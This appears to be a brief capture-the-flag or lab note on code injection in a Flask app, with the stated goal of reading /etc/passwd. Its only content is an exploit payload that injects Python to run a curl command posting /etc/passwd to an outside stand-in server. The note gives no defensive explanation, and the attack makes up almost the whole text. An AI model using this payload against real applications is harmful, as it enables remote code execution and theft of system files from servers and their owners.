# code injection flask app 01

### try to read the /etc/passwd file





## exploit

```
%s'%__import__("os").system("curl -X POST -d @/etc/passwd your-server.test")%'
```